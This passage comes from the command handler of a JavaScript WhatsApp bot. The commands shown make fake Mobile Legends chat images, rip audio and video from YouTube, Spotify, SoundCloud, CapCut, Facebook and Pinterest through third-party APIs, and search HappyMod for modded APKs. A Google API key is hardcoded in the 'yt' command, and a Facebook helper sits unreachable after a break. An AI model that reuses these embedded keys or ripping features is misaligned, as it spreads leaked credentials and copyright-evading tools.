            return xreply(`❌ *FAKE LOBBY ML ERROR*

${errorMessage}`);
          }
        }
        break;
      case 'fakeml2':
        {
          await m.react('✨');
          let q = m.quoted;
          if (!q) {
            return client.sendMessage(m.chat, {
              text: "ℹ️ how to use:\nreply to an image then type *.fakeml the text*"
            }, {
              quoted: global.fcontacts
            });
          }
          let mime = (q.msg || q).mimetype || '';
          if (!mime.startsWith('image/')) {
            return client.sendMessage(m.chat, {
              text: "ℹ️ how to use:\nreply to an image then type *.fakeml the text*"
            }, {
              quoted: m
            });
          }
          let buffer = await q.download().catch(() => null);
          if (!buffer) return;
          let ext = mime.split('/')[1] || 'jpg';
          let tempFile = path.join(process.cwd(), `fakeml_${Date.now()}.${ext}`);
          fs.writeFileSync(tempFile, buffer);
          try {
            const uguuRes = await UploadFileUgu(tempFile);
            let avatarUrl = typeof uguuRes === 'string' ? uguuRes : uguuRes?.url || uguuRes?.result?.url || uguuRes?.files?.[0]?.url;
            let apiUrl = `${global.APIs.deline}/maker/fakeml?text=${encodeURIComponent(text)}&avatar=${encodeURIComponent(avatarUrl)}`;
            let res = await fetch(apiUrl);
            if (!res.ok) throw 'API error';
            let resultBuffer = await res.buffer();
            await client.sendMessage(m.chat, {
              image: resultBuffer,
              caption: '✨ Fake ML Chat'
            }, {
              quoted: global.fcontacts
            });
          } catch (e) {
            console.error(e);
            await client.sendMessage(m.chat, {
              text: "❌ failed to process the image"
            }, {
              quoted: global.fcontacts
            });
          } finally {
            if (fs.existsSync(tempFile)) fs.unlinkSync(tempFile);
          }
        }
        break;

      /// ───────────── [ 𝖲𝗈𝗎𝗇𝖽𝖢𝗅𝗈𝗎𝖽 & 𝖲𝗉𝗈𝗍𝗂𝖿𝗒 ] ──────────── ///
      case 'playclound':
      case 'scsearch':
        {
          if (!text) return xreply(`Example: ${prefix + command} DJ Tiktok`);
          try {
            const axios = require('axios');
            let api = `https://api.soonex.biz.id/v1/search/soundcloud?q=${encodeURIComponent(text)}`;
            let {
              data
            } = await axios.get(api);
            console.log(data);
            if (!data.status) {
              return xreply(`*no song found!* ☹️`);
            }
            let result = data.result[0];
            if (!result) {
              return xreply(`*no song found!* ☹️`);
            }
            let caption = `「 *SOUNDCLOUD SEARCH* 」\n\n`;
            caption += `🎵 Title : ${result.title}\n`;
            caption += `▶️ Plays : ${result.plays}\n`;
            caption += `❤️ Likes : ${result.likes}\n`;
            caption += `🔗 URL : ${result.url}\n`;
            await client.sendMessage(m.chat, {
              image: {
                url: result.artwork
              },
              caption: caption,
              footer: `${global.namaOwner}`,
              buttons: [{
                buttonId: `${prefix}scdl ${result.url}`,
                buttonText: {
                  displayText: "🎵 Download Audio"
                },
                type: 1
              }],
              headerType: 1
            }, {
              quoted: m
            });
          } catch (err) {
            console.log(err);
            xreply(`❌ Error search SoundCloud`);
          }
        }
        break;
      case 'soundcloud':
      case 'scdl':
        {
          if (!text) {
            return xreply(`example:
.scdl https://soundcloud.com/xxxx/xxxx`);
          }
          try {
            const axios = require('axios');
            await client.sendMessage(m.chat, {
              react: {
                text: '🎵',
                key: m.key
              }
            });
            let api = `https://api.azbry.com/api/download/soundcloud?url=${encodeURIComponent(text)}`;
            let {
              data
            } = await axios.get(api);
            console.log(data);
            if (!data.status) {
              return xreply("❌ failed to fetch audio");
            }
            let result = data.result;
            await client.sendMessage(m.chat, {
              audio: {
                url: result.download
              },
              mimetype: 'audio/mpeg',
              fileName: `${result.title}.mp3`,
              ptt: false
            }, {
              quoted: m
            });
          } catch (err) {
            console.log(err);
            xreply("❌ an error occurred during the download SoundCloud");
          }
        }
        break;
      case "playsf":
        {
          try {
            if (!text) {
              return reply(`usage example:
${prefix + command} sesi potret`);
            }
            Reply("⏳ searching for the song on Spotify...");
            const axios = require("axios");
            const api = `https://api.nexray.eu.cc/downloader/spotifyplay?q=${encodeURIComponent(text)}`;
            const {
              data
            } = await axios.get(api);
            if (!data.status || !data.result) {
              return reply("❌ no song found.");
            }
            let res = data.result;
            let caption = `*🎵 SPOTIFY PLAY*

*📀 Judul :* ${res.title}
*🎤 Artist :* ${res.artist}
*💽 Album :* ${res.album}
*⏱ Durasi :* ${res.duration}
*⭐ Popularity :* ${res.popularity}
*📅 Release :* ${res.release_at}

*🔗 Spotify :*
${res.url}

⏳ sending the audio...`;
            await client.sendMessage(m.chat, {
              image: {
                url: res.thumbnail
              },
              caption
            }, {
              quoted: m
            });
            await client.sendMessage(m.chat, {
              audio: {
                url: res.download_url
              },
              mimetype: "audio/mpeg",
              fileName: `${res.title}.mp3`,
              ptt: false
            }, {
              quoted: m
            });
          } catch (e) {
            console.log(e);
            Reply("❌ an error occurred during fetching the Spotify song.");
          }
        }
        break;

      /// ───────────── [ 𝖸𝗈𝗎𝖳𝗎𝖻𝖾 𝖯𝗅𝖺𝗒 ] ──────────── ///
      case 'play':
        {
          if (!text) return xreply(`Example: ${prefix + command} sad song`);
          try {
            await client.sendMessage(m.chat, {
              react: {
                text: '⏳',
                key: m.key
              }
            });
            const {
              data
            } = await axios.get(`https://api.ikyyxd.my.id/search/ytplay?q=${encodeURIComponent(text)}`, {
              timeout: 60000
            });
            if (!data.status || !data.result || !data.result.audio?.url) {
              await client.sendMessage(m.chat, {
                react: {
                  text: '❌',
                  key: m.key
                }
              });
              return xreply(`*no song found!* ☹️`);
            }
            const res = data.result;
            const minutes = Math.floor(res.duration / 60);
            const seconds = res.duration % 60;
            const durationText = `${minutes}:${seconds.toString().padStart(2, '0')}`;
            const caption = `「 *YOUTUBE PLAY* 」
└╼ Title : ${res.title}
└╼ Duration : ${durationText}
└╼ URL Video : ${res.source}`;
            await client.sendMessage(m.chat, {
              image: {
                url: res.thumbnail
              },
              caption: caption,
              contextInfo: {
                isForwarded: true,
                ...(global.newsletterInfo ? { forwardedNewsletterMessageInfo: global.newsletterInfo } : {})
              }
            }, {
              quoted: m
            });
            await client.sendMessage(m.chat, {
              audio: {
                url: res.audio.url
              },
              mimetype: 'audio/mpeg',
              fileName: `${res.title}.mp3`,
              ptt: false
            }, {
              quoted: m
            });
            await client.sendMessage(m.chat, {
              react: {
                text: '✅',
                key: m.key
              }
            });
          } catch (err) {
            console.error(err);
            await client.sendMessage(m.chat, {
              react: {
                text: '❌',
                key: m.key
              }
            });
            xreply(`*an error occurred!* 😭
${err.message || err}`);
          }
        }
        break;
      case 'play-v2':
      case 'playv2':
        {
          if (!text) return xreply(`Example: ${prefix + command} sad song`);
          try {
            await client.sendMessage(m.chat, {
              react: {
                text: '⏳',
                key: m.key
              }
            });
            const {
              data
            } = await axios.get(`https://api.ikyyxd.my.id/search/ytplayv2?q=${encodeURIComponent(text)}`, {
              timeout: 60000
            });
            if (!data.status || !data.result || !data.result.audio?.url) {
              await client.sendMessage(m.chat, {
                react: {
                  text: '❌',
                  key: m.key
                }
              });
              return xreply(`*no song found!* ☹️`);
            }
            const res = data.result;
            const minutes = Math.floor(res.duration / 60);
            const seconds = res.duration % 60;
            const durationText = `${minutes}:${seconds.toString().padStart(2, '0')}`;
            const caption = `「 *YOUTUBE PLAY V2* 」
└╼ Title : ${res.title}
└╼ Duration : ${durationText}
└╼ URL Video : ${res.source}`;
            await client.sendMessage(m.chat, {
              image: {
                url: res.thumbnail
              },
              caption: caption,
              contextInfo: {
                isForwarded: true,
                ...(global.newsletterInfo ? { forwardedNewsletterMessageInfo: global.newsletterInfo } : {})
              }
            }, {
              quoted: m
            });
            await client.sendMessage(m.chat, {
              audio: {
                url: res.audio.url
              },
              mimetype: 'audio/mpeg',
              fileName: `${res.title}.mp3`,
              ptt: false
            }, {
              quoted: m
            });
            await client.sendMessage(m.chat, {
              react: {
                text: '✅',
                key: m.key
              }
            });
          } catch (err) {
            console.error(err);
            await client.sendMessage(m.chat, {
              react: {
                text: '❌',
                key: m.key
              }
            });
            xreply(`*an error occurred!* 😭
${err.message || err}`);
          }
        }
        break;
      case 'ytsearch':
      case 'yts':
        {
          if (!text) return xreply(`Example: ${prefix + command} Epep`);
          try {
            await client.sendMessage(m.chat, {
              react: {
                text: '🔎',
                key: m.key
              }
            });
            await xreply(`⏳ searching *${text}* in YouTube...`);
            const {
              data
            } = await axios.get(`https://api.ikyyxd.my.id/search/youtube?apikey=kyzz&query=${encodeURIComponent(text)}`, {
              timeout: 60000
            });
            if (!data.status || !data.result || !Array.isArray(data.result) || data.result.length === 0) {
              await client.sendMessage(m.chat, {
                react: {
                  text: '❌',
                  key: m.key
                }
              });
              return xreply(`❌ video not found for: *${text}*`);
            }
            const results = data.result.slice(0, 10);
            const cards = [];
            for (const item of results) {
              try {
                const media = await prepareWAMessageMedia({
                  image: {
                    url: item.imageUrl
                  }
                }, {
                  upload: client.waUploadToServer
                });
                cards.push({
                  header: proto.Message.InteractiveMessage.Header.fromObject({
                    hasMediaAttachment: true,
                    ...media
                  }),
                  body: proto.Message.InteractiveMessage.Body.fromObject({
                    text: `*${item.title}*`
                  }),
                  footer: proto.Message.InteractiveMessage.Footer.fromObject({
                    text: `📺 ${item.channel}\n⏱️ ${item.duration}`
                  }),
                  nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                    buttons: [{
                      "name": "cta_url",
                      "buttonParamsJson": JSON.stringify({
                        display_text: "Watch the video",
                        url: item.link,
                        merchant_url: "https://www.google.com"
                      })
                    }]
                  })
                });
              } catch (err) {
                console.error(`failed to process card for ${item.title}:`, err.message);
                continue;
              }
            }
            if (cards.length === 0) {
              await client.sendMessage(m.chat, {
                react: {
                  text: '❌',
                  key: m.key
                }
              });
              return xreply("❌ failed loading image from result search.");
            }
            const msgii = await generateWAMessageFromContent(m.chat, {
              viewOnceMessage: {
                message: {
                  messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                  },
                  interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                    body: proto.Message.InteractiveMessage.Body.fromObject({
                      text: `🔎 *SEARCH RESULTS YOUTUBE*`
                    }),
                    carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                      cards: cards
                    })
                  })
                }
              }
            }, {
              userJid: m.sender,
              quoted: m
            });
            let additionalNodes = [{
              tag: "biz",
              attrs: {},
              content: [{
                tag: "interactive",
                attrs: {
                  type: "native_flow",
                  v: "1"
                },
                content: [{
                  tag: "native_flow",
                  attrs: {
                    v: "9",
                    name: "mixed"
                  },
                  content: []
                }]
              }]
            }];
            if (!m.chat.endsWith("@g.us")) {
              additionalNodes.push({
                tag: "bot",
                attrs: {
                  biz_bot: "1"
                },
                content: []
              });
            }
            await client.relayMessage(m.chat, msgii.message, {
              messageId: msgii.key.id,
              additionalNodes: additionalNodes
            });
            await client.sendMessage(m.chat, {
              react: {
                text: '✅',
                key: m.key
              }
            });
          } catch (err) {
            console.error('[YTSEARCH ERROR]', err);
            await client.sendMessage(m.chat, {
              react: {
                text: '❌',
                key: m.key
              }
            });
            xreply(`❌ *an error occurred!*

${err.message || err}`);
          }
        }
        break;

      /// ───────────── [ 𝖸𝖳𝖬𝖯3 & 𝖸𝖳𝖬𝖯4 ] ──────────── ///
      case 'ytmp3':
        {
          try {
            if (!text) return xreply(example('https://youtube.com/watch?v=...'));
            if (!text.includes('youtu')) return xreply('⚠️ Enter Link YouTube\n\n.ytmp3 <link>');
            await client.sendMessage(m.chat, {
              react: {
                text: '⏳',
                key: m.key
              }
            });
            const {
              data: json
            } = await axios.get(`http://api.ikyyxd.my.id/download/ytmp3?url=${encodeURIComponent(text)}`, {
              timeout: 120000
            });
            console.log('[YTMP3 RESPONSE]', JSON.stringify(json, null, 2));
            const isOk = json?.status === true || json?.status === 200 || json?.status === 'success' || json?.success === true || json?.result || json?.data;
            if (!isOk) {
              return xreply(`❌ *Failed to fetch the audio*\n\n${json?.message || json?.error || json?.msg || "the API did not respond correctly."}`);
            }
            const data = json.result || json.data || json;
            const downloadUrl = data.download || data.url || data.dl || data.link || data.mp3 || data.audio || Array.isArray(data.medias) && data.medias.find(v => /audio|mp3/i.test(v.type || v.quality || ''))?.url || null;
            const title = data.title || data.name || data.judul || 'YouTube Audio';
            const duration = data.duration || data.length || data.durasi || '-';
            if (!downloadUrl) {
              return xreply(`❌ Download URL not found in response.

` + `Response API:\n\`\`\`\n${JSON.stringify(json).slice(0, 1500)}\n\`\`\``);
            }
            const {
              data: buffer
            } = await axios.get(downloadUrl, {
              responseType: 'arraybuffer',
              timeout: 300000,
              maxContentLength: Infinity,
              maxBodyLength: Infinity
            });
            const audioBuffer = Buffer.from(buffer);
            if (!audioBuffer.length) throw new Error('Audio file is empty.');
            const safeTitle = (title.replace(/[^\w\s-]/gi, '_').trim() || 'audio').slice(0, 80);
            const sizeMB = (audioBuffer.length / 1024 / 1024).toFixed(2);
            const caption = `🎵 *${title}*\n` + `⏱ Duration : ${duration}\n` + `📦 Size : ${sizeMB} MB\n\n` + `> ${global.botname || 'Akoya-MD'}`;
            if (audioBuffer.length > 1024 * 1024 * 100) {
              await client.sendMessage(m.chat, {
                document: audioBuffer,
                mimetype: 'audio/mpeg',
                fileName: `${safeTitle}.mp3`,
                caption
              }, {
                quoted: m
              });
            } else {
              await client.sendMessage(m.chat, {
                audio: audioBuffer,
                mimetype: 'audio/mpeg',
                fileName: `${safeTitle}.mp3`,
                ptt: false
              }, {
                quoted: m
              });
              await xreply(caption);
            }
            await client.sendMessage(m.chat, {
              react: {
                text: '✅',
                key: m.key
              }
            });
          } catch (e) {
            console.error('[YTMP3 ERROR]', e?.response?.data || e?.message || e);
            await client.sendMessage(m.chat, {
              react: {
                text: '❌',
                key: m.key
              }
            }).catch(() => {});
            return xreply(`❌ *Error*\n\n${e?.response?.data?.message || e?.response?.data?.error || e?.message || e}`);
          }
        }
        break;
      case 'ytmp4':
        {
          try {
            if (!text) return xreply(example('https://youtube.com/watch?v=... | 720'));
            let link = text;
            let format = '720';
            if (text.includes('|')) {
              const parts = text.split('|').map(v => v.trim());
              link = parts[0];
              format = parts[1] || '720';
            }
            if (!link.includes('youtu')) return xreply('⚠️ Enter Link YouTube\n\n.ytmp4 <link>|<format>\nFormat: 144, 240, 360, 720, 1080');
            const formats = ['144', '240', '360', '720', '1080'];
            if (!formats.includes(format)) return xreply(`⚠️ Format available: ${formats.join(', ')}`);
            await client.sendMessage(m.chat, {
              react: {
                text: '⏳',
                key: m.key
              }
            });
            const {
              data: json
            } = await axios.get(`http://api.ikyyxd.my.id/download/ytmp4?url=${encodeURIComponent(link)}&quality=${format}`, {
              timeout: 120000
            });
            console.log('[YTMP4 RESPONSE]', JSON.stringify(json, null, 2));
            const isOk = json?.status === true || json?.status === 200 || json?.status === 'success' || json?.success === true || json?.result || json?.data;
            if (!isOk) return xreply(`❌ *Failed to fetch the video*\n\n${json?.message || json?.error || json?.msg || "the API did not respond correctly."}`);
            const data = json.result || json.data || json;
            const downloadUrl = data.download || data.url || data.dl || data.link || data.mp4 || data.video || Array.isArray(data.medias) && (data.medias.find(v => String(v.quality || '').includes(format))?.url || data.medias[0]?.url) || null;
            const title = data.title || data.name || data.judul || 'YouTube Video';
            if (!downloadUrl) return xreply(`❌ Download URL not found.

Response:
\`\`\`
${JSON.stringify(json).slice(0, 1500)}\n\`\`\``);
            const {
              data: buffer
            } = await axios.get(downloadUrl, {
              responseType: 'arraybuffer',
              timeout: 600000,
              maxContentLength: Infinity,
              maxBodyLength: Infinity
            });
            const videoBuffer = Buffer.from(buffer);
            if (!videoBuffer.length) throw new Error('Video file is empty.');
            const safeTitle = (title.replace(/[^\w\s-]/gi, '_').trim() || 'video').slice(0, 80);
            const sizeMB = (videoBuffer.length / 1024 / 1024).toFixed(2);
            const caption = `🎬 *${title}*\n` + `📺 Quality : ${format}p\n` + `📦 Size : ${sizeMB} MB\n\n` + `> ${global.botname || 'Akoya-MD'}`;
            if (videoBuffer.length > 1024 * 1024 * 30) {
              await client.sendMessage(m.chat, {
                document: videoBuffer,
                mimetype: 'video/mp4',
                fileName: `${safeTitle}_${format}p.mp4`,
                caption
              }, {
                quoted: m
              });
            } else {
              await client.sendMessage(m.chat, {
                video: videoBuffer,
                mimetype: 'video/mp4',
                fileName: `${safeTitle}_${format}p.mp4`,
                caption
              }, {
                quoted: m
              });
            }
            await client.sendMessage(m.chat, {
              react: {
                text: '✅',
                key: m.key
              }
            });
          } catch (e) {
            console.error('[YTMP4 ERROR]', e?.response?.data || e?.message || e);
            await client.sendMessage(m.chat, {
              react: {
                text: '❌',
                key: m.key
              }
            }).catch(() => {});
            return xreply(`❌ *Error*\n\n${e?.response?.data?.message || e?.response?.data?.error || e?.message || e}`);
          }
        }
        break;
      case 'ytmp2':
        {
          try {
            if (!args[0]) return xreply(`Usage: ${prefix + command} <url>`);
            await client.sendMessage(m.chat, {
              react: {
                text: '⏳',
                key: m.key
              }
            });
            let url = `https://www.sankavollerei.com/download/ytmp3?apikey=planaai&url=${encodeURIComponent(args[0])}`;
            let res = await axios.get(url);
            let json = res.data;
            if (!json.status) return xreply(`❌ failed to fetch data from API`);
            let {
              title,
              thumbnail,
              download,
              duration
            } = json.result;
            await client.sendMessage(m.chat, {
              audio: {
                url: download
              },
              mimetype: 'audio/mpeg',
              fileName: `${title}.mp3`
            }, {
              quoted: m
            });
          } catch (err) {
            xreply(`❌ Error\nLogs error : ${err.message}`);
          }
        }
        break;
      case 'yt':
      case 'youtube':
        {
          const axios = require('axios');
          if (!text) return xreply(`usage example:
• yt search lofi
• yt channel lofi girl
• yt latest lofi girl
• yt stat https://youtube.com/watch?v=abc123`);
          const subcmd = text.split(' ')[0].toLowerCase();
          const query = text.replace(subcmd, '').trim();
          const apikey = 'AIzaSyBI6P58kEwxWywxh_UeCUpQC7_T5xwieTg';
          if (!['search', 'channel', 'latest', 'stat'].includes(subcmd)) return xreply("unknown sub-feature. Use one of: search, channel, latest, stat");
          try {
            if (subcmd === 'search') {
              if (!query) return xreply("example: yt search lofi chill");
              const {
                data
              } = await axios.get(`https://www.googleapis.com/youtube/v3/search`, {
                params: {
                  part: 'snippet',
                  q: query,
                  key: apikey,
                  type: 'video',
                  maxResults: 30
                }
              });
              if (!data.items.length) return xreply("video not found.");
              let teks = '*Search results YouTube:*\n\n';
              data.items.forEach(v => {
                teks += `• *${v.snippet.title}*\n`;
                teks += ` Channel: ${v.snippet.channelTitle}\n`;
                teks += ` Link: https://youtube.com/watch?v=${v.id.videoId}\n\n`;
              });
              return xreply(teks);
            }
            if (subcmd === 'channel') {
              if (!query) return xreply("example: yt channel lofi girl");
              const search = await axios.get(`https://www.googleapis.com/youtube/v3/search`, {
                params: {
                  part: 'snippet',
                  q: query,
                  type: 'channel',
                  key: apikey
                }
              });
              const ch = search.data.items[0];
              if (!ch) return xreply("channel not found.");
              const channelId = ch.id.channelId;
              const detail = await axios.get(`https://www.googleapis.com/youtube/v3/channels`, {
                params: {
                  part: 'snippet,statistics,brandingSettings',
                  id: channelId,
                  key: apikey
                }
              });
              const info = detail.data.items[0];
              if (!info) return xreply("failed to fetch detail channel.");
              const bannerUrl = info.brandingSettings?.image?.bannerExternalUrl;
              const cap = `*Channel Info:*
• *Nama:* ${info.snippet.title}
• *Subscriber:* ${info.statistics.subscriberCount}
• *Views:* ${info.statistics.viewCount}
• *Total Video:* ${info.statistics.videoCount}
• *Dibuat:* ${new Date(info.snippet.publishedAt).toLocaleDateString()}
• *Lokasi:* ${info.snippet.country || "unknown"}
• *Link:* https://youtube.com/channel/${channelId}

*Deskripsi:*\n${info.snippet.description?.slice(0, 500) || "no description."}`;
              await client.sendMessage(m.chat, {
                image: {
                  url: info.snippet.thumbnails.high.url
                },
                caption: cap
              }, {
                quoted: m
              });
              if (bannerUrl) await client.sendMessage(m.chat, {
                image: {
                  url: bannerUrl
                },
                caption: 'Banner Channel'
              }, {
                quoted: m
              });
              return;
            }
            if (subcmd === 'latest') {
              if (!query) return xreply("example: yt latest lofi girl");
              const search = await axios.get(`https://www.googleapis.com/youtube/v3/search`, {
                params: {
                  part: 'snippet',
                  q: query,
                  type: 'channel',
                  key: apikey
                }
              });
              const ch = search.data.items[0];
              if (!ch) return xreply("channel not found.");
              const channelId = ch.id.channelId;
              const latest = await axios.get(`https://www.googleapis.com/youtube/v3/search`, {
                params: {
                  key: apikey,
                  channelId,
                  part: 'snippet,id',
                  order: 'date',
                  maxResults: 1
                }
              });
              const vid = latest.data.items[0];
              if (!vid) return xreply("video latest not found.");
              const caption = `*video Terbaru from ${vid.snippet.channelTitle}:*
• *Judul:* ${vid.snippet.title}
• *Link:* https://youtube.com/watch?v=${vid.id.videoId}`;
              return client.sendMessage(m.chat, {
                image: {
                  url: vid.snippet.thumbnails.high.url
                },
                caption
              }, {
                quoted: m
              });
            }
            if (subcmd === 'stat') {
              if (!query.includes('youtube.com/watch')) return xreply("example: yt stat https://youtube.com/watch?v=abc123");
              const videoId = new URL(query).searchParams.get('v');
              const res = await axios.get(`https://www.googleapis.com/youtube/v3/videos`, {
                params: {
                  part: 'snippet,statistics,status,contentDetails',
                  id: videoId,
                  key: apikey
                }
              });
              const video = res.data.items[0];
              if (!video) return xreply("video not found.");
              const cap = `*Statistik Video:*
• *Judul:* ${video.snippet.title}
• *Channel:* ${video.snippet.channelTitle}
• *Tayang:* ${new Date(video.snippet.publishedAt).toLocaleDateString()}
• *Views:* ${video.statistics.viewCount}
• *Likes:* ${video.statistics.likeCount}
• *Komentar:* ${video.statistics.commentCount}
• *Kategori ID:* ${video.snippet.categoryId}
• *Status:* ${video.status.privacyStatus}
• *Lisensi:* ${video.status.license}
• *Tags:* ${video.snippet.tags?.slice(0, 5).join(', ') || "no tag"}
• *Link:* https://youtube.com/watch?v=${videoId}

*Deskripsi:* 
${video.snippet.description?.slice(0, 1000) || "no description."}`;
              return xreply(cap);
            }
          } catch (err) {
            console.error(err);
            return xreply("failed to fetch data from YouTube. try again later.");
          }
        }
        break;

      /// ───────────── [ 𝖢𝖺𝗉𝖼𝗎𝗍 & 𝖥𝖺𝖼𝖾𝖻𝗈𝗈𝗄 ] ──────────── ///
      case 'capcut':
        {
          try {
            if (!args[0]) return xreply('*Example :* .capcut https://www.capcut.com/tv2/ZSDrUV5e8/');
            let {
              data
            } = await axios.post('https://3bic.com/api/download', {
              url: args[0]
            }, {
              headers: {
                accept: 'application/json, text/plain, */*',
                'content-type': 'application/json'
              }
            });
            let base64url = data?.originalVideoUrl?.split('/api/cdn/')[1];
            let video = Buffer.from(base64url, 'base64').toString();
            await client.sendMessage(m.chat, {
              video: {
                url: video
              }
            }, {
              quoted: m
            });
          } catch (e) {
            xreply(e.message);
          }
        }
        break;
      case "fb":
        {
          if (!text) return xreply(`example:.fb https://www.facebook.com/share/v/...`);
          xreply('wett');
          try {
            const {
              hd,
              sd
            } = await fb(text);
            const videoUrl = hd || sd;
            await client.sendFile(m.chat, videoUrl, '_zenwik.mp4', '', m);
          } catch (e) {
            xreply(`Eror: ${e.message}`);
          }
        }
        break;
        const fb = async urlFesnuk => {
          if (typeof urlFesnuk !== "string") throw Error(`where is the URL?`);
          const r = await fetch("https://fdown.net/download.php", {
            method: "POST",
            headers: {
              "content-type": "application/x-www-form-urlencoded"
            },
            body: new URLSearchParams({
              URLz: urlFesnuk
            })
          });
          if (!r.ok) {
            const txt = await r.text();
            throw Error(`${r.status} ${r.statusText} ${(txt || `(empty response body)`).substring(0, 100)}`);
          }
          const html = await r.text();
          const hd = html.match(/id="hdlink" href="(.+?)" download/)?.[1]?.replaceAll("&amp;", "&");
          const sd = html.match(/id="sdlink" href="(.+?)" download/)?.[1]?.replaceAll("&amp;", "&");
          if (!hd && !sd) throw Error(`no video can in download`);
          return {
            hd,
            sd
          };
        };

      /// ───────────── [ 𝖯𝗂𝗇𝗍𝖾𝗋𝖾𝗌𝗍 ] ──────────── ///
      case "pindown":
        {
          try {
            if (!text) {
              return xreply(`📌 example:

.pindown https://pin.it/2xc4pVU2g`);
            }
            await xreply("⏳ fetching media Pinterest...");
            const axios = require("axios");
            const {
              data
            } = await axios.get(`https://api.azbry.com/api/download/pinterest?url=${encodeURIComponent(text)}`);
            if (!data.status || !data.result) {
              return xreply("❌ failed to fetch data Pinterest");
            }
            const res = data.result;
            let caption = `📌 *PINTEREST DOWNLOADER*\n\n`;
            caption += `📝 Judul : ${res.title || "(no title)"}\n`;
            caption += `👤 User : ${res.user?.fullName || "-"}\n`;
            caption += `🏷 Username : ${res.user?.username || "-"}\n`;
            caption += `❤️ Likes : ${res.stats?.likes || 0}\n`;
            caption += `🔁 Shares : ${res.stats?.shares || 0}\n`;
            caption += `💬 Komentar : ${res.stats?.comments || 0}\n`;
            caption += `🎬 Tipe : ${res.type || "-"}\n`;
            if (res.type === "video" && res.download) {
              let videoUrl = String(res.download).replace(/\\\//g, "/").trim();
              try {
                const vid = await axios.get(videoUrl, {
                  responseType: "arraybuffer",
                  headers: {
                    "User-Agent": "Mozilla/5.0"
                  }
                });
                await client.sendMessage(m.chat, {
                  video: Buffer.from(vid.data),
                  mimetype: "video/mp4",
                  caption
                }, {
                  quoted: m
                });
              } catch {
                await client.sendMessage(m.chat, {
                  video: {
                    url: videoUrl
                  },
                  caption
                }, {
                  quoted: m
                });
              }
            } else if (res.images && res.images.length > 0) {
              let imageUrl = String(res.images[0]).replace(/\\\//g, "/").trim();
              await client.sendMessage(m.chat, {
                image: {
                  url: imageUrl
                },
                caption
              }, {
                quoted: m
              });
            } else if (res.thumbnail) {
              let thumbUrl = String(res.thumbnail).replace(/\\\//g, "/").trim();
              await client.sendMessage(m.chat, {
                image: {
                  url: thumbUrl
                },
                caption
              }, {
                quoted: m
              });
            } else {
              xreply("❌ Media not found");
            }
          } catch (e) {
            console.log(e);
            xreply(`❌ Error:\n${e?.response?.data?.message || e?.message || e}`);
          }
        }
        break;
      case 'pin':
      case 'pinfoto':
        {
          const axios = require('axios');
          const https = require('https');
          const agent = new https.Agent({
            rejectUnauthorized: true,
            maxVersion: 'TLSv1.3',
            minVersion: 'TLSv1.2'
          });
          async function getCookies() {
            try {
              const response = await axios.get('https://www.pinterest.com/csrf_error/', {
                httpsAgent: agent
              });
              const setCookieHeaders = response.headers['set-cookie'];
              if (setCookieHeaders) {
                const cookies = setCookieHeaders.map(cookieString => {
                  const cookieParts = cookieString.split(';');
                  return cookieParts[0].trim();
                });
                return cookies.join('; ');
              }
              return null;
            } catch {
              return null;
            }
          }
          async function pinterest(query) {
            try {
              const cookies = await getCookies();
              if (!cookies) return [];
              const url = 'https://www.pinterest.com/resource/BaseSearchResource/get/';
              const params = {
                source_url: `/search/pins/?q=${query}`,
                data: JSON.stringify({
                  options: {
                    isPrefetch: false,
                    query: query,
                    scope: "pins",
                    no_fetch_context_on_resource: false
                  },
                  context: {}
                }),
                _: Date.now()
              };
              const headers = {
                'accept': 'application/json, text/javascript, */*, q=0.01',
                'accept-encoding': 'gzip, deflate',
                'accept-language': 'en-US,en;q=0.9',
                'cookie': cookies,
                'dnt': '1',
                'referer': 'https://www.pinterest.com/',
                'sec-ch-ua': '"Not(A:Brand";v="99", "Microsoft Edge";v="133", "Chromium";v="133"',
                'sec-ch-ua-full-version-list': '"Not(A:Brand";v="99.0.0.0", "Microsoft Edge";v="133.0.3065.92", "Chromium";v="133.0.6943.142"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-model': '""',
                'sec-ch-ua-platform': '"Windows"',
                'sec-ch-ua-platform-version': '"10.0.0"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0',
                'x-app-version': 'c056fb7',
                'x-pinterest-appstate': 'active',
                'x-pinterest-pws-handler': 'www/[username]/[slug].js',
                'x-pinterest-source-url': '/hargr003/cat-pictures/',
                'x-requested-with': 'XMLHttpRequest'
              };
              const {
                data
              } = await axios.get(url, {
                httpsAgent: agent,
                headers,
                params
              });
              return data.resource_response.data.results.filter(v => v.images?.orig).map(result => ({
                upload_by: result.pinner.username,
                fullname: result.pinner.full_name,
                followers: result.pinner.follower_count,
                caption: result.grid_title,
                image: result.images.orig.url,
                source: "https://id.pinterest.com/pin/" + result.id
              }));
            } catch {
              return [];
            }
          }
          if (!text) return xreply(`*Usage:* ${prefix + command} <query> <count>\n\n*Example:* ${prefix + command} anime 3`);
          let [query, count] = text.split(' ');
          let imgCount = 5;
          if (text.indexOf(' ') !== -1) {
            const lastWord = text.split(' ').pop();
            if (!isNaN(lastWord) && lastWord.trim() !== '') {
              imgCount = parseInt(lastWord);
              query = text.substring(0, text.lastIndexOf(' '));
            } else {
              query = text;
            }
          } else {
            query = text;
          }
          xreply('Searching Pinterest images...');
          try {
            const results = await pinterest(query);
            if (results.length === 0) return reply(`No results found for "${query}". Try another search term.`);
            const imagesToSend = Math.min(results.length, imgCount);
            xreply(`Sending ${imagesToSend} Pinterest images for "${query}"...`);
            for (let i = 0; i < imagesToSend; i++) {
              await client.sendMessage(m.chat, {
                image: {
                  url: results[i].image
                }
              });
            }
          } catch {
            xreply('Error occurred while fetching Pinterest images. Please try again later.');
          }
        }
        break;

      /// ───────────── [ 𝖠𝖯𝖪 𝖬𝗈𝖽 ] ──────────── ///
      case 'apkmod':
        {
          async function getMod(q) {
            try {
              const anu = `https://happymod.com/search.html?q=${q}`;
              const {
                data
              } = await axios.get(anu);
              const $ = cheerio.load(data);
              let result = [];
              $(".pdt-app-box").each((_, el) => {
                const title = $(el).find("h3").text().trim();
                const link = "https://happymod.com" + $(el).find('a').attr('href');
                const rate = $(el).find("span.a-search-num").text().trim();
                result.push({
                  title,
                  link,
                  rate
                });
              });
              return result;
            } catch (e) {
              console.error(e);
